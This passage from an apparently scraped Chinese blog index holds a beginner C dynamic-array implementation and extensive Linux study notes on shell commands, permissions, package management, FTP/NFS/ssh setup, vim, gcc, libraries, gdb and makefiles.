Print_Array(Dynamic_Array * arr);//释放动态数组的内存void FreeSpace_Array(Dynamic_Array * arr);//清空数组void Clear_Array(Dynamic_Array * arr);//获得动态数组容量int Capacity_Array(Dynamic_Array * arr);//获得动态数据当前元素个数int Size_Array(Dynamic_Array * arr);//根据位置获得某个位置元素int At_Array(Dynamic_Array * arr, int pos);#endif DynamicArray.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161#include\"DynamicArray.h\"//初始化Dynamic_Array * Init_Array() &#123; Dynamic_Array * myArray = (Dynamic_Array *)malloc(sizeof(Dynamic_Array)); if (myArray == NULL) &#123; return NULL; &#125; myArray-&gt;size = 0; myArray-&gt;capacity = 20; myArray-&gt;pAddr = (int *)malloc(myArray-&gt;capacity * sizeof(int)); if (myArray-&gt;pAddr == NULL) &#123; return NULL; &#125; return myArray;&#125;//插入void Push_Back_Array(Dynamic_Array* arr, int value) &#123; if (arr == NULL) &#123; return; &#125; //判断空间是否足够 if (arr-&gt;size == arr-&gt;capacity) &#123; //第一步,申请一块更大的内存空间,新空间是旧空间的两倍 int* newSpace = (int *)malloc(arr-&gt;capacity * sizeof(int) * 2); //第二步,拷贝数据到新空间 memcpy(newSpace, arr-&gt;pAddr, arr-&gt;capacity * sizeof(int)); //第三步,释放旧空间的内存 free(arr-&gt;pAddr); //更新容量 arr-&gt;capacity = arr-&gt;capacity * 2; arr-&gt;pAddr = newSpace; &#125; //插入新元素 arr-&gt;pAddr[arr-&gt;size] = value; arr-&gt;size++;&#125;//根据位置删除void Remove_Array(Dynamic_Array * arr, int pos) &#123; if (arr == NULL) &#123; return; &#125; //判断位置是否有效 if (pos &lt; 0 || pos &gt;= arr-&gt;size) &#123; return; &#125; //删除元素 for (int i = pos; i &lt; arr-&gt;size - 1; i++) &#123; arr-&gt;pAddr[i] = arr-&gt;pAddr[i + 1]; &#125; arr-&gt;size--;&#125;//根据值删除void RemoveByValue(Dynamic_Array * arr, int value) &#123; if (arr == NULL) &#123; return; &#125; int pos = Find_Array(arr,value); if (pos &lt; 0 || pos &gt;= arr-&gt;size) &#123; return; &#125; Remove_Array(arr, pos);&#125;//查找int Find_Array(Dynamic_Array * arr, int value) &#123; if (arr == NULL) &#123; return -1; &#125; int pos = -1; for (int i = 0; i &lt; arr-&gt;size; i++) &#123; if (arr-&gt;pAddr[i] == value) &#123; pos = i; break; &#125; &#125; return pos;&#125;//打印void Print_Array(Dynamic_Array * arr) &#123; if (arr == NULL) &#123; return; &#125; for (int i = 0; i &lt; arr-&gt;size; i++) &#123; printf(\"%d \", arr-&gt;pAddr[i]); &#125; printf(\"\\n\");&#125;//释放动态数组的内存void FreeSpace_Array(Dynamic_Array * arr) &#123; if (arr != NULL) &#123; if (arr-&gt;pAddr != NULL) &#123; free(arr-&gt;pAddr); &#125; free(arr); &#125; arr = NULL;&#125;//清空数组void Clear_Array(Dynamic_Array * arr) &#123; if (arr == NULL) &#123; return; &#125; arr-&gt;size = 0;&#125;//获得动态数组容量int Capacity_Array(Dynamic_Array * arr) &#123; if (arr == NULL) &#123; return -1; &#125; return arr-&gt;capacity;&#125;//获得动态数据当前元素个数int Size_Array(Dynamic_Array * arr) &#123; if (arr == NULL) &#123; return -1; &#125; return arr-&gt;size;&#125;//根据位置获得某个位置元素int At_Array(Dynamic_Array * arr, int pos) &#123; if (arr == NULL) &#123; return -1; &#125; return arr-&gt;pAddr[pos];&#125; main.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263// 动态数组.cpp : 此文件包含 \"main\" 函数。程序执行将在此处开始并结束。//#include&lt;stdio.h&gt;#include\"DynamicArray.h\"void test() &#123; //初始化 Dynamic_Array *myArr = Init_Array(); if (myArr == NULL) &#123; return; &#125; printf(\"数组容量:%d\\n\", Capacity_Array(myArr)); printf(\"数组元素长度:%d\\n\", Size_Array(myArr)); //插入元素 for (int i = 0; i &lt; 30; i++) &#123; Push_Back_Array(myArr, i); &#125; //打印 Print_Array(myArr); //获取容量 printf(\"数组容量:%d\\n\", Capacity_Array(myArr)); //获取元素个数 printf(\"数组元素长度:%d\\n\", Size_Array(myArr)); //查找元素 int pos = Find_Array(myArr, 20); printf(\"查找20的元素:pos=%d value=%d\\n\", pos, myArr-&gt;pAddr[pos]); //根据位置获得某个位置元素 printf(\"元素:%d\\n\", At_Array(myArr,pos)); //根据位置删除 Remove_Array(myArr, pos); Print_Array(myArr); //根据值删除 RemoveByValue(myArr, 23); Print_Array(myArr); //清空数组 Clear_Array(myArr); printf(\"数组容量:%d\\n\", Capacity_Array(myArr)); printf(\"数组元素长度:%d\\n\", Size_Array(myArr)); //释放数组 FreeSpace_Array(myArr);&#125;int main()&#123; test(); return 0;&#125;","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[]},{"title":"linux1-4","slug":"linux004-1-4","date":"2021-12-23T13:29:16.000Z","updated":"2022-01-06T18:24:08.000Z","comments":true,"path":"2021/12/23/linux004-1-4/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/12/23/linux004-1-4/","excerpt":"","text":"终端：(虚拟终端) 所有输入输出设备总称 shell： 命令解析器 bash： bore again shell 命令解析器。 快捷键: 命令和路径补齐: tab 主键盘快捷键: 1).历史命令切换: 历史命令:history 向上遍历: ctrl + p 向下遍历: ctrl + n 2).光标移动: 向左: ctrl + b 向右: ctrl + f 移动到头部: ctrl + a 移动到尾部: ctrl + e 3).删除字符: 删除光标后边的字符: ctrl + d 删除光标前面的字符: ctrl + h 删除光标前面的所有内容: ctrl + u / 根目录 ls / /bin 常用的命令 cd /bin 进入bin目录 /boot 开机启动项文件 /dev 设备文件 /etc 配置文件 /home 主目录,存放用户 /lib 动态链接库(共享库) /lost-found 存放文件碎片 /media 挂载外设 U盘或光盘等等 /mnt 手动挂载外设到这个目录 /opt 第三方软件 /root 超级用户目录 /sbin 管理员使用的系统管理程序 /usr 用户软件资源目录(用户的软件或文件) /usr/bin 系统用户的应用程序 /usr/sbin 超级用户使用的管理程序和系统守护程序 /usr/src 内核源码默认的放置目录 ctrl + l 清屏,或clear cd 进入指定目录 绝对路径 从/开始 相对路径 ./当前路径 …/上一级路径 cd - 两个相邻目录切换 cd ~ 切换到当前用户目录 cd 切换到用户目录 yxc19980620c@yc:~$ yxc19980620c 用户名 yc 主机名 ~ 用户目录 $普通用户 超级用户root 切换到超级用户 sudo su 或 su root -rw-r–r-- 1 root root 1937 9月 2 2020 ucontext.h 文件类型 所有者 所属组 其他人 硬连接数 文件所有者 文件所属组 文件大小 日期 文件名 文件类型 - 普通文件 d 目录 l 链接符号 b 块设备 c 字符设备 s socket文件 p 管道 ls和tree的使用: ls -a 显示所有文件 ls -l 详细显示 ls -R 递归列出当前目录 ls -al ls -h 人性化显示文件大小 tree 目录 pwd 查看当前位置 文件目录和文件的创建 mkdir 目录名 mkdir dri/dir/dir -p 递归创建目录 mkdir -p dir/dir/dir touch 文件名 touch 文件名1 文件名2 … 文件名n 删除目录和文件 ​ rmdir 空目录名 ​ rm 目录名 -rf (f代表不提示) ​ rm 文件名 -f ​ rm 目录名 -ri (i代表提示) 文件和目录的拷贝 ​ cp 源文件 目标文件名 ​ cp h1 h2 将h1复制一份并命名为h2 ​ 如果h2存在将原来内容覆盖 ​ cp 源目录 目标目录 -r ​ 如果目标目录不存在就将源码目拷贝一份并命名为目标目录 ​ 如果目标目录存在,就将源目录拷贝一份,复制到目的目录里面 查看文件内容 gedit 文件名 cat 文件名 cat 文件1 文件2 … 文件n 拼接查看文件 cat 文件1 | more more 文件名 回车 一行 空格 一页 只能往后看 q 退出 ctrl + c 退出 less 文件名 回车 一行 空格 一页 可以往前后看 q 退出 ctrl + c 退出 ctrl + p 向前一行 ctrl + n 向后一行 ctrl +b 向前一页 ctrl + f 向后一下 head 文件名 显示文件前十行 head -5 文件名 显示文件前五行 tail 文件名 显示文件后十行 tail -5 文件名 显示文件后五行 mv命令 ​ 文件改名 1mv 源文件 改名后的文件 移动 1mv 文件名 目录名 //将文件移动到目录中 ln 创建软链接 ​ 1ln -s 源文件(绝对路径) 目标文件 ​ 创建软链接最好使用绝对路径 ​ ln 创建硬链接 1ln 源文件(绝对路径) 目标文件 ​ 只有文件才可以创建硬链接，不可以为目录创建硬链接 ​ 硬链接是指向i（inode）节点的，在linux中所有文件都有一个i节点，i节点保存了一些文件信息 ​ linux通过i节点找到文件的位置 文件的检索 1234 grep -r &quot;文件内容&quot; 路径 -r代表递归检索文件grep -r &quot;printf&quot; / 从根目录开始递归查找文件包含&quot;printf&quot;内容的文件 文件和目录属性命令 wc 获取文本文件的信息 12yxsdc19c@yscc:/usr/include$ wc time.h 309 1515 10360 time.h ​ 309代表行数 1515代表单词个数 10360代表字节数 od 查看二进制文件 od -t 文件名 -t 指定数据的显示格式 -tc ASCII字符 -tx 十六进制数 -td 有符号十进制数 -tu 无符号十进制数 -to 八进制数 -tf 浮点数 查看某个目录的大小du ​ 1du -h 目录 查看磁盘的使用情况 1df -h 查看命令在哪个目录 which 1which 命令名 ​ 内建命令是查不到的，例如cd，只能查外建命令 ​ 查看当前用户 whoami ​ 1whoami 修改文件权限 文字设定法： chmod [who] [+|-|=] [mode] ​ who: ​ 文件所有者： u ​ 文件所属组： g ​ 其他人： o ​ 所有的人： a ​ +：添加权限 -：减少权限 =：覆盖原来的权限 mode： r：读 w：写 x：执行 123chmod go-rw 文件名chmod go+rw 文件名chmod go=w 文件名 数字设定法 ​ -：没有权限 ​ r：4 ​ w：2 ​ x：1 765 7 – rwx --文件所有者 6 – rw --文件所属组 5 – rx --其他人 12chmod 765 文件名chmod -001 文件名 //减去其他人的执行权限 修改文件所有者和所属组 ​ 修改文件所有者 12chown 用户名 文件名 //改变所有者chown 用户名:所属组 文件名 //同时改变所有者和所属组 修改文件所属组 ​ 1chgrp 所属组 文件名 目录必须拥有执行权限 如果目录没有执行权限x，会提示进不去的 文件的查找 按文件属性查找： ​ 文件名： 1find 查找的目录 -name “文件的名字” 通配符：*代表所有字符 ？ 代表一个字符 文件大小： 1find 查找的目录 / -size +10k · find 查找的目录 / -size -10k · find 查找的目录 / -size -10M find 查找的目录 / -size +10k -size -10M //表示大于10KB小于10MB的文件 +代表大于 - 代表小于 数字后面的字母区分大小写 文件类型： find 查找的目录 -type 文件类型 12find / -type sfind / -type s 按文件内容查找 1grep -r “查找内容” 查找路径 ​ -r 代表递归查找 创建管道文件： ​ 1mkfifo 文件名 软件的安装和卸载 在线安装 ​ apt-get ​ 安装 1sudo apt-get install 软件名 ​ 卸载 1sudo apt-get remove 软件名 ​ 更新 1sudo apt-get update 更新软件列表 ​ 软件列表存放的是软件名字和下载地址 清理所有软件安装包 1sudo apt-get clean 实际清理的是: /var/cache/apt/archives目录下的.deb文件 aptitude 安装： 1sudo aptitude install 软件名 重新安装： 1sudo aptitude reinstall 软件名 更新： 1sudo apt-get update 移除： 1sudo aptitude rermove 软件名 显示状态： 1sudo aptitude show 软件名 deb包安装 安装 1sudo dpkg -i xxx.deb 卸载 1sudo dpkg -r xxx 源码安装 1.解压缩源代码包 2.进入到安装目录 3. 检测文件是否缺失,创建Makefile,检测编译环境: ./configure 4.编译源码 生成库和可以执行程序:make 5.把库和可执行程序,安装到系统目录下: sudo make install 6.删除和卸载软件:sudo make distclean 7.上述安装步骤并不是绝对的,应该先查看附带的README文件 U盘挂载和卸载 卸载: 1umount 设备文件名 挂载: 1mount 设备文件名 挂载路径 自己在U盘目录里面是无法卸载的 ，就相当于不能在自己房间里才房间一样 将外设挂载到非mnt目录时,会临时覆盖原来内容,卸载之后会恢复 lsof命令 ​ 用于查看你进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP)。 ​ 12lsof 参数 文件lsof /mnt/ ​ -a 列出打开文件存在的进程 -c&lt;进程名&gt; 列出指定进程所打开的文件 -g 列出GID号进程详情 -d&lt;文件号&gt; 列出占用该文件号的进程 +d&lt;目录&gt; 列出目录下被打开的文件 +D&lt;目录&gt; 递归列出目录下被打开的文件 -n&lt;目录&gt; 列出使用NFS的文件 -i&lt;条件&gt; 列出符合条件的进程。（4、6、协议、:端口、 @ip ） -p&lt;进程号&gt; 列出指定进程号所打开的文件 -u 列出UID号进程详情 -h 显示帮助信息 -v 显示版本信息 gzip 压缩出来的文件以.gz结尾 不保留源文件 不能对目录进行打包压缩 12gzip 文件名gzip *.txt ​ 解压： 12gunzip 文件名gunzip *.gz bzip2 — .bz2 ​ -k 来保留源文件 不能对目录进行打包压缩 ​ 123bzip2 文件名bzip2 *.txtbzip2 -k *.txt tar 不使用z/j参数，该命令只能对文件或目录打包 c–创建—压缩 x–释放—解压缩 v–显示提示信息 f–指定压缩文件的名字 z–使用gzip的方式压缩文件 j–使用bzip2的方式压缩文件 压缩： 12tar -zcvf 生成的压缩包的名字（xxx.tar.gz） 要压缩的文件或目录tar -jcvf 生成的压缩包的名字（xxx.tar.bz2）要压缩的文件或目录 解压： 12345tar -zxvf 压缩包名字 //解压到当前目录tar -jxvf 压缩包名字 //解压到当前目录 tar -zxvf 压缩包名字 -C（大写） 指定的目录tar -zxvf xxx.tar.gz -C ./testtar -jxvf xxx.tar.gz -C ./test rar ​ 压缩： 12rar a 压缩包的文件名 源文件rar a bird *.c ​ 解压： 1234rar x 压缩包名 （解压到当前文件夹）rar x 压缩包名 解压的路径rar x bird.rarrar x bird.rar ./ zip ​ 参数： 压缩目录要加参数 -r ​ 压缩： 12zip 压缩包的名字 压缩的文件或目录zip man *.txt ​ 解压缩： 12unzip 压缩包的名字unzip 压缩包的名字 -d 解压目录 ps 查看进程信息 ​ 参数： ​ a 显示现行终端机下的所有程序，包括其他用户的程序。 ​ u代表 以用户为主的格式来显示程序状况。 ​ x 代表没有终端的程序 1ps aux | 管道 ​ 将A输出作为B输入 1ps aux | grep bash //将ps输出的结果作为grep的输入，然后将结果显示回终端 kill ​ 1234kill -l //查看信号kill -信号(可以只写数字) PIDkill -9 13442kill -SIGKILL 123432 env和top 12env查看环境变量top 打开任务管理器 linux 环境变量： ​ 变量=值 ​ 多个值用 : 隔开 ​ PATH=A:B:C:D ifconfig查看ip ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.44.135 netmask 255.255.255.0 broadcast 192.168.44.255 inet6 fe80::7438:27c1:6044:963d prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:0c:29:f2:c7:2a txqueuelen 1000 (以太网) RX packets 28453 bytes 18295064 (18.2 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 10656 bytes 815687 (815.6 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (本地环回) RX packets 945 bytes 84825 (84.8 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 945 bytes 84825 (84.8 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ens33: 代表设备名 broadcast 广播地址 inet： ip地址 ping 命令 ​ 检查网络是否通 ​ 12345ping ip地址ping 192.168.1.123ping ip地址 -c 次数 //ping多少次ping ip地址 -i 秒数 //每隔多少秒返回一次结果ping 域名 nslookup 把域名转换为ip 1nslookup 域名 用户管理: 1adduser 用户名 ​ 创建一个用户 ​ 需要管理员权限 ​ 用户名不能有大写字母 1sudo adduser abc su ​ 切换用户 1su 用户名 exit ​ 退出当前用户 useradd ​ 创建一个用户 ​ 用户名可以大写 ​ 需要管理员权限 1useradd -s /bin/bash -g xiaoai -d /home/xiaoai -m xiaoai ​ -s 表示使用什么命令解析器 ​ -g 用户组 ​ -d 用户家目录 ​ -m 如果用户家目录不存在,则创建一个目录 groupadd ​ 添加一个用户组 ​ 需要管理员权限 ​ 1groupadd 用户组名 ​ passwd ​ 修改用户密码 ​ 需要管理员权限 1passwd 用户名 ​ passwd 不加sudo 不输入用户名表示修改当前用户密码 ​ sudo passwd 表示修改root用户密码 deluser ​ 删除用户 ​ 1deluser 用户名 ​ 需要手动删除家目录 userdel ​ 删除用户 ​ 1userdel -r 用户名 ​ 不需要手动删除家目录 查看当前系统下有哪些用户 12vim /etc/passwdyxc19980620c:x:1000:0:yc:/home/yxc19980620c:/bin/bash ​ /bin/bash 代表使用什么命令解析器 ftp服务器配置 vsftpd 作用:文件上传和下载 ftp服务器配置 ​ 配置文件在/etc/vsftpd.conf 12345678910111213anonymous_enable=YES 允许匿名用户登录write_enable=YES 实名登录用户拥有写的权限local_umask=022 设置本地掩码为022anon_mkdir_write_enable=YES 匿名用户可以在ftp服务器上创建目录listen_ipv6=NOlisten=YES 重启ftp服务 ​ 1sudo service vsftpd restart ftp服务 1234567sudo service vsftpd start 启动ftpsudo service vsftpd stop关闭ftp服务sudo service vsftpd restart重启ftp服务。service vsftpd status查看状态 实名登录ftp 123ftp ip地址 输入用户 输入密码 ​ 退出 123bye quitexit 文件上传和下载 上传 在什么目录登录的,文件默认从那里找 1put 文件名 下载 1get 文件名 不允许操作目录,可以打包处理 匿名登录服务器 用户名 anonymous 密码是空 不允许匿名用户在任意目录直接切换 只能在一个指定的目录范围内工作 需要在ftp服务器上创建一个匿名用户的目录 --匿名用户的根目录 ​ 配置文件在/etc/vsftpd.conf 在配置文件添加 anon_root=/home/yxc19980620c/myFtp/ 匿名登录默认路径是在/srv/ftp 在配置文件/etc/passwd可以查看并修改 1ftp:x :123:127:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin lftp客户端 ​ 1sudo apt-get install lftp //下载 ​ 登录服务器: 匿名: 1lftp 服务器ip ​ 输入login ​ 实名: 12lftp 用户名@ip地址 输入服务器密码 1234567891011lpwd 获取本地当前目录地址pwd 获取服务器当前目录地址lcd 目录 //切换本地目录cd 目录 //切换服务器目录put 文件名 //上传文件mput 文件1 文件2 文件3 //上传多个文件get 文件名 //下载文件mget 文件1 文件2 文件3 //下载多个文件mirror 目录名 //下载整个目录及其子目录mirror -R 目录名 //上传整个目录及其子目录 nfs服务器 ​ 安装 ​ 1sudo apt-get install nfs-kernel-server ​ 功能： 创建一个共享目录 ​ 1).先创建一个目录 mkdir 目录名 2).修改配置文件 /etc/exports 添加这一行 /home/用户名/共享目录 *（访问权限，sync） /home/qwe/aa *（rw，sync） *代表ip地址 访问权限有ro（只读），rw（可读可写），sync（代表实时更新） ro 只读 rw 读写 root_squash 当NFS客户端以root管理员访问时，映射为NFS服务器的匿名用户 no_root_squash 当NFS客户端以root管理员访问时，映射为NFS服务器的root管理员 all_squash 无论NFS客户端使用什么账户访问，均映射为NFS服务器的匿名用户 sync 同时将数据写入到内存与硬盘中，保证不丢失数据 async 优先将数据保存到内存，然后再写入硬盘；这样效率更高，但可能会丢失数据 重启服务 1sudo service nfs-kernel-server restart 客户端： ​ 挂载服务器共享目录 12mount 服务器ip:共享目录 /mntmount 192.168.1.123:/home/xiaoh/nfs /mnt aptitude 查看软件是否安装 ​ 12安装 ：sudo apt-get install aptitudesudo aptitude show 软件名 ssh 远程登录到服务器 ​ 安装： 1sudo apt-get install openssh-server ​ 查看是否安装ssh 1sudo aptitude show openssh-server 配置文件：/etc/ssh/ssh_config 远程登录： 123ssh 用户名@ip输入yes或no输入密码 退出登录： 1logout scp命令 ​ 超级复制 ​ 使用该命令的前提条件是目标主机已经成功安装openssh-server ​ 使用格式： 1scp -r 目标用户名@目标主机ip地址:/目标文件的绝对路径 /保存到本机的绝对（相对）路径 ​ 拷贝目录要加-r，拷贝文件不需要加-r ​ 1scp -r yxc19980620c@192.168.44.135:/home/yxc19980620c/test2 ./test3 终端翻页 Shift + PageDown 下翻页 清屏： clear Ctrl+l 创建终端： Ctrl+Alt + T（Ubuntu） Ctrl+Shift +T（添加新标签页） 看手册： 1man [编号] 命令名 ​ 编号： ​ 1 普通用户可以执行的系统命令和可执行文件的帮助 ​ 2 内核可以调用的函数和工具的帮助 ​ 3 C语言函数的帮助 ​ 4 设备和特殊文件的帮助 ​ 5 配置文件的帮助 ​ 6 游戏的帮助（个人版的Linux中是有游戏的） ​ 7 杂项的帮助 ​ 8 超级用户可以执行的系统命令的帮助 ​ 9 内核的帮助 设置或查看别名 ​ 查看 ​ 12alias 命令名alias ls ​ 设置 ​ 12alias 新命令名=&apos;命令操作&apos;alias pag=&apos;ps aux | grep&apos; ​ 需要长久有效需要去设置配置文件：.bashrc echo 在显示器上显示数据 普通数据: echo 字符串 显示环境变量: 12echo $变量名echo $PATH ​ 显示上一次程序退出值: ​ 1echo $? ​ $代表取值 poweroff 关机 reboot 重启 shutdown -a 指定权限 -r 重启计算器（和reboot）命令一样 -k 模拟关机（只向用户发出警告信息，但不关机） -h 关闭计算机并关闭电源（常用） -n 不调用init进程关闭计算机（不推荐） -c 取消正在执行的关机命令 -f 重启计算机，但不进行磁盘检测 -F 重启计算机，进行磁盘检测 -t(秒) 指定发出警告信息与删除信息时要延迟的秒数 123shutdown -r now //加now则是立即重启shutdown -h +1 &quot;1 minute after shutdown&quot; //设置1分钟以后关闭计算机，并在SSH中提示“1 minute after shutdown” shutdown -c //取消关机 shutdown now //切换至单人操作模式 vi----vim ​ vim是从vi发展过来的一款文本编辑器 1vi a.txt 前提安装了vim软件 工作模式： 命令模式：-- 打开文件之后，默认就是命令模式（ESC键） 编辑模式：–需要输入一些命令，切换到编辑模式(iaos，IAOS)，按esc键回到命令模式 末行模式：-- 在末行模式可以输入一些命令（ : 键 ） 按两次esc键切回命令模式 编辑模式不能直接切回到末行模式，需要先切换到命令模式，然后再切回到末行模式 命令模式下的操作： 光标移动： ​ H J K L ​ 前 下 上 后 ​ 行首：0 ​ 行尾：$ ​ 文件开始位置：gg ​ 文件末尾：G ​ 行跳转：300g 删除操作： ​ 删除光标后边的字符：x ​ 删除光标前的字符：X ​ 删除单词：dw（光标移动到单词开始位置，否则只能删除一部分） ​ 删除光标到行首的字符串：d0 ​ 删除光标到行尾字符串：D（d$） ​ 删除光标当前行：dd ​ 删除光标多行：ndd（n–自然数） 撤销操作： ​ 撤销：u ​ 反撤销：ctrl+r ​ 复制粘贴: ​ 复制：yy ​ 复制多行：nyy ​ 粘贴：p（光标所在行的下一行） 粘贴：P（大写，光标所在行） ​ 在vim中剪切等于删除 剪切：dd（剪切一行） 剪切多行：ndd（n–自然数） 可视模式： ​ 切换到可视模式：v ​ 选择内容：h j k l ​ 复制：y 删除当前行：d ​ 粘贴：小写p（粘贴到光标下一个字符）或大写P（粘贴到光标上一个字符） ​ 查找操作： ​ /查找内容 往下找 ​ ？查找内容 往上找 把光标移动到查找的单词上，按# ​ 遍历快捷键：n或N，往下找n是下一个，N是是一个，往上找n是上一个，N是下一个，取决于查找方向 ​ r：替换当前字符 按下r之后输入一个字符，只能替换一个字符 ​ 缩进： ​ 向右：&gt;&gt; ​ 向左：&lt;&lt; ​ 查看帮助文档，首先光标移动到关键字或函数那里，然后按下数字，例如3，在按shitf+k 文本模式下的操作： ​ 切换到文本模式： ​ a – 在光标所在位置的后边插入 ​ A – 在当前行的尾部插入 ​ i – 在光标所在位置的前边插入 I – 在光标所在行的行首插入 o – 在光标所在行的下边开辟一个新的行 O – 在光标所在行的上边开辟一个新的行 s – 删除光标后边的字符，然后插入 S – 删除光标所在行，然后插入 末行模式下的操作： ​ 替换：先查找,然后光标移动到要替换的行 123456:s/tom/jack 代表用jack替换当前行的第一个toms/tom/jack/g 代表用jack替换当前行的所有tom:%s/tom/jack 代表用jack替换当前文本所有行的第一个tom:%s/tom/jack/g 代表用jack替换当前文本的所有tom:20,25s/tom/jack/g 代表用jack替换20行到25行的tom:20,25s/tom/jack/ 代表用jack替换20行到25行的第一个tom 保存退出: ​ :q 退出 ​ :q! 退出不保存 ​ :w 保存 ​ :wq 保存退出 ​ :x 保存退出 命令模式下的保存退出:ZZ 命令模式分屏操作: :sp 将屏幕分成两部分 水平 ：vsp 将屏幕分成两部分 垂直 :sp或vsp +文件名,水平或垂直拆分窗口显示两个不同的文件 :wqall保存并退出所有屏幕 :wall 保存所有 :wq保存并退出光标所在的屏幕 :q 退出当前屏幕 ctrl+ww 切换屏幕 vim打造IDE 系统级配置文件目录:/etc/vim/vimrc 用户级配置文件目录: ~/.vim/vimrc 编译过程： 源文件----&gt;预处理—&gt;编译—&gt;汇编----&gt;链接----&gt;可执行文件 预处理器(.i)—&gt;编译器(.s)----&gt;汇编器(.o)----&gt;链接器 hello.c—&gt;hello.i-----&gt;hello.s-----hello.o----a.out ​ 预处理器(cpp):头文件展开,宏替换,注释去掉 1gcc -E hello.c -o hello.i 编译器(gcc):c文件编程汇编文件 1gcc -S hello.i -o hello.s 汇编器(as):汇编文件变成二进制文件 1gcc -c hello.s -o hello.o 链接器(ld):将函数库中相应的代码组合到目标文件中 1gcc hello.o -o hello 直接生成可执行文件： 12gcc hello.c -o myappgcc hello.c //生成一个默认的可执行文件 a.out 指定头文件目录 12gcc hello.c -I ./include -o appgcc hello.c -I./include -o app 旧版本的gcc -I后面不可以有空格 ​ ./include就是头文件的目录 #ifdef DEBUG printf(“123”) #endif 通过gcc定义一个DEBUG宏 1gcc hello.c -o app -D DEBUG 优化程序(-O大写) ​ 优化等级 0~3，0不优化 1gcc hello.c -o app —O3 输出警告信息（-Wall） 1gcc hello.c -o app -Wall 添加调试信息（-g） 1gcc hello.c -o app -g 静态库的制作和使用 命名规则： 12lib + 库的名字 +.a例如：libMylib.a 制作步骤： ​ 1)生成对应的.o文件 1gcc *.c -c ​ 2)将生成的.o文件打包 12ar rcs 静态库的名字 生成的所有.o文件ar rcs libMylib.a *.o 发布和使用静态库 ​ 1)发布静态库 ​ 2)头文件 使用: 12345gcc main.c 库的目录和名字 -o maingcc main.c ./libMylib.a -o maingcc main.c -L 库的目录 -l 库的名字(将lib和.a去掉) -o maingcc main.c -L lib -l Mylib -o main 静态库的优缺点： ​ 优点： ​ 发布程序的时候不需要提供对应的库 ​ 加载库的速度快 ​ 缺点； 库被打包到应用程序中，导致库的体积很大 库发生改变，需要重新编译程序 链接器是以.o为单位链接的 nm 1nm 库的名字/可执行程序 可以查看库的一些信息 T 代表在代码区 共享库(动态库) 共享库的制作： ​ 命名规则： 1lib+名字+.so ​ 制作步骤： ​ 1）生成与位置无关的代码（生成与位置无关的.o） 1gcc -fPIC -c *.c ​ 2)将.o打包成共享库(动态库) 1gcc -shared -o libMylib.so *.o 共享库是程序运行的时候才加载的 ​ 发布和使用共享库(动态库) ​ 1)头文件 ​ 2)库文件 ​ 使用： 12gcc main.c 库的目录和名字 -o maingcc main.c ./libMylib.so -o main ​ 解决程序执行时动态库无法被加载的问题 ​ 1）将库文件放到/lib目录里(不建议使用) ​ 2）临时设置终端环境变量 环境变量:LD_LIBRARY_PATH=将动态库的路径设置给该变量 将设置的值,导入到环境变量中: 12export LD_LIBRARY_PATH=目录export LD_LIBRARY_PATH=./lib ​ 终端关闭失效 ​ 3）设置家目录.bashrc配置文件 ​ 在.bashrc文件最后一行添加 1export LD_LIBRARY_PATH=目录(绝对路径) ​ 每次启动bash时都会自动执行这条命令 ​ 终端重启生效 ​ 4） ​ 1.需要找动态链接器的配置文件 ​ 1/etc/ld.so.conf ​ 2.动态库的路径写到配置文件 ​ 3.更新 1sudo ldconfig -v 动态库的优缺点: ​ 优点: ​ 1)执行程序体积小 ​ 2)动态库更新了,不需要重新编译程序,前提是函数接口不变 ​ 缺点: 发布程序的时候，需要将动态库提供给用户 动态库没有被打包到应用程序中，加载速度相对较慢 gdb调试 可执行程序必须包含调试信息-g 12gdb 程序名gdb main 123456789l 输出十行源代码l 文件名:要查看第几行l main.c 10l 文件名:函数名l main.c main后面继续按回车可以继续显示源代码,直到输入了其他命令 设置断点 1234567b 行号/函数名break 行号/函数名break 22b 37b mainbreak main 条件断点 12b 行号 if 条件b 15 if i==15 //当i等于15时,设置15行断点 查看断点信息 12345678i b或info breakNum Type Disp Enb Address What1 breakpoint keep y 0x00000000000006cf in main at main.c:6enb y表示断点开始,n表示断点关闭main.c:6 代表在main.c文件的第六行断点 删除断点 1234需要通过 info break 找到断点编号d 编号d 4 1start 执行一步 单步调试 1n 继续执行 12c 代表执行到断点的位置 进入函数内部 1s 查看变量的值 12p 变量名p i 查看变量的类型 12ptype 变量名ptype i 追踪变量的值 12345678display 变量名display i取消追踪变量undisplay 追踪变量的编号undisplay 1查看追踪变量的编号info display 跳出当次循环 1u 跳出当前函数 1finish 循环有断点需要先删除断点 设置变量的值 12set var 变量名=值set var i=10 退出gdb 1quit makefile 项目代码管理工具 1).命名规则 Makefile或makefile 2).makefile的规则: 规则中有三要素:目标,依赖,命令 12make make命令运行makefile 123456目标:依赖 命令 //命令左边一定要有一个tab缩进app:main.c add.c sub.c mul.c gcc main.c add.c sub.c mul.c -o app 12345678main:main.o add.o gcc main.o add.o -o mainmain.o:main.c gcc -c main.cadd.o:add.c gcc -c add.c 当add.c的修改时间 大于add.o的修改时间时,表示文件过时了 终极目标一定要在最前面 makefile中的变量 12变量名=值$(变量名) 代表取变量的值 1234567obj=main.o add.otarget=main$(target):$(obj) gcc $(obj) -o $(target)%.o:%.c gcc -c $&lt; -o $@ 1%.o:%.c代表自动匹配,当main.o找不到的时候,会自动匹配%.o:%.c,然后变成main.o:main.c makefile中的自动变量 1234$&lt; 规则中的第一个依赖$@ 规则中的目标$^ 规则中的所有依赖只能在规则的命令中使用 由Makefile维护的一些变量 